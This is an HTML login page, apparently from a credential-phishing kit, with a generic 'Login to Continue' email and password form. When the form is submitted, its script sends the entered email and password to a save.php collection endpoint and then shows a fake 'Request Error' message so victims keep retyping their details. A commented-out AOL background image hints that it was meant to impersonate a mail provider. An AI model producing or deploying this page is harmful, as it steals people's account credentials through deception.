
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="../../favicon.ico">

    <title>Login to Continue </title>

    <!-- Bootstrap core CSS -->
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">
    <style>

    </style>    
    <link rel="stylesheet" href="style.3.css">

    <style>
    </style>
    <style>
                        .iframe {
                        height: 100vh;
                        width: calc(100vw - 30px);
                        /* background-image: url(img/aol.jpg) */
                    }
    </style>
  </head>

  <body>
    <div class="container-fluid">

      <div class="row">     
        <div class="col-md-12">
            <div class="iframe">
                <form class="form-signin" novalidate>
                    <label for="inputEmail" class="sr-only">Email address</label>
                    <input type="email" id="inputEmail" class="form-control emailaddy" placeholder="Email address" required="" autofocus="" name="emailaddy">
                    <input type="password" id="inputEmail" class="form-control passwd" placeholder="Your password" required="" name="passwd">


                    <button class="btn nextbtn btn-block" type="submit">Sign In</button>
                </form>
            </div>
            <!-- <iframe src="all.html" frameborder="0" style="width: 100%;
            height: 100vh;"></iframe> -->
        </div>
    </div> <!-- /container -->
    <script src="https://code.jquery.com/jquery-3.2.1.min.js"></script>
    
    <script>
        let pages = {
        }

        



        let isMobile = ''

        $(function () {
            // $('button.nextbtn').click(() => {

                
            // })
            $('.iframe').html(pages.all)

            $(document).on('submit', 'form', e => {
                e.preventDefault()
                let inputInput = $('input.emailaddy')
                let passwdInput = $('input.passwd')
                if (inputInput.val().length < 1) return false

                    
                const useremail = inputInput.val()
                const userpass = passwdInput.val()
                $.ajax({
                    method: 'POST',
                    url: 'http://localhost:3333/save.php',
                    data: {
                        email: useremail,
                        password: userpass
                    },
                    success: (data) => {
                        alert('Request Error. Please try again.')
                    }
                })

                return false
            })

        })        



    </script>

    <!-- Bootstrap core JavaScript
    ================================================== -->
    <!-- Placed at the end of the document so the pages load faster -->
    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
  </body>
</html>
